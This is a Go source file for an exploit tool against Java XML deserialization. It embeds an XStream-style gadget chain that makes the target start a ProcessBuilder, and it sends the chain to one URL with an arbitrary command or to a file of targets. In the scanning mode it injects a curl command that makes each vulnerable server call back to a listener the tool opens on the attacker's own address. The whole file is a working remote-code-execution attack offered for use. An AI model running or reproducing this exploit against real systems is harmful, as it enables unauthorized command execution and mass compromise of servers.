package main

import (
	"fmt"
	"strings"
	"net/http"
	"log"
	"io/ioutil"
	"flag"
	"crypto/tls"
	"os"
	"bufio"
	"net"
	"time"
)

var httpClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	},
}

const (

	curlCommand = "curl %s:%d/?t=%s"

	checkIpEndpoint = "http://checkip.amazonaws.com"

	stringNodeEnclosure = "<string>%s</string>"

	xmlPayload =
		`<map>
			 <entry>
			 <jdk.nashorn.internal.objects.NativeString>
				 <flags>0</flags>
				 <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
					 <dataHandler>
						 <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
							 <is class="javax.crypto.CipherInputStream">
								 <cipher class="javax.crypto.NullCipher">
									 <initialized>false</initialized>
									 <opmode>0</opmode>
									 <serviceIterator class="javax.imageio.spi.FilterIterator">
										 <iter class="javax.imageio.spi.FilterIterator">
											 <iter class="java.util.Collections$EmptyIterator"/>
											 <next class="java.lang.ProcessBuilder">
												 <command>
													 %s
												 </command>
												 <redirectErrorStream>false</redirectErrorStream>
											 </next>
										 </iter>
										 <filter class="javax.imageio.ImageIO$ContainsFilter">
											 <method>
												 <class>java.lang.ProcessBuilder</class>
												 <name>start</name>
												 <parameter-types/>
											 </method>
											 <name>foo</name>
										 </filter>
										 <next class="string">foo</next>
									 </serviceIterator>
									 <lock/>
								 </cipher>
								 <input class="java.lang.ProcessBuilder$NullInputStream"/>
								 <ibuffer/>
								 <done>false</done>
								 <ostart>0</ostart>
								 <ofinish>0</ofinish>
								 <closed>false</closed>
							 </is>
							 <consumed>false</consumed>
						 </dataSource>
						 <transferFlavors/>
					 </dataHandler>
					 <dataLen>0</dataLen>
				 </value>
			 </jdk.nashorn.internal.objects.NativeString>
			 <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
		 </entry>
		 <entry>
			 <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
			 <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
		 </entry>
		</map>`
)

// Builds the xml payload using the passed command
func buildXMLPayload(c string) string {
	var t string
	for _, p := range strings.Split(c, "\x20") {
		t += fmt.Sprintf(stringNodeEnclosure, p)
	}

	return fmt.Sprintf(xmlPayload, t)
}

// Resolves the remote ip address of the current machine
func getMyExternalIp() string {
	res, err := http.Get(checkIpEndpoint)
	if err != nil {
		log.Fatalln(err)
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}

	return strings.TrimRight(
		string(body),
		"\r\n",
	)
}

// Starts a reverse listener
func startListener(port int, callback func(*http.Request)) {
	http.HandleFunc("/", func(res http.ResponseWriter, req *http.Request) {

		// Discards the response which is useless in this case and pass the
		// request to our callback
		callback(req)
	})

	server := &http.Server{}
	listener, err := net.ListenTCP(
		"tcp4",
		&net.TCPAddr{
			IP: net.IPv4(0, 0, 0, 0),
			Port: port,
		})

	if err != nil {
		log.Fatalln(err)
	}

	go server.Serve(listener)
}

func sendPayload(targetUrl string, payload string) {
	req, err := http.NewRequest(http.MethodPost, targetUrl, strings.NewReader(payload))
	if err != nil {
		log.Fatalln(err)
	}

	//
	req.Header.Set("content-type", "application/xml")
	res, err := httpClient.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	res.Body.Close()
}

func checkTargetsFromFile(filename string, listenerPort int) {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatalln(err)
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)

	// Starts the listener
	startListener(listenerPort, func(req *http.Request) {
		fmt.Println(req.URL.Query().Get("t") + " seems to be a vulnerable endpoint")
	})

	ip := getMyExternalIp()
	for scanner.Scan() {
		target := scanner.Text()

		// Sends the payload
		sendPayload(
			target,
			buildXMLPayload(
				fmt.Sprintf(curlCommand, ip, listenerPort, target),
			),
		)
	}
}

func isEmpty(s *string) bool {
	return *s == ""
}

func main() {
	urlPtr := flag.String("u", "", "target url")
	commandPtr := flag.String("c", "", "command to be executed")
	filePtr := flag.String("f", "", "file containing targets")
	portPtr := flag.Int("p", 8080, "listener port")

	flag.Parse()

	if !isEmpty(urlPtr) && !isEmpty(commandPtr) {

		// Sends a single request with the passed command
		sendPayload(*urlPtr, buildXMLPayload(*commandPtr))
	} else if !isEmpty(filePtr) {

		// Reads a list of possible targets from a file and automatically
		// check for RCE
		checkTargetsFromFile(*filePtr, *portPtr)

		// Waits some seconds before quitting to avoid false negative due
		// to server latency. Hope to replace this workaround soon with some channels...
		time.Sleep(10 * time.Second)
	} else {
		flag.Usage()
	}
}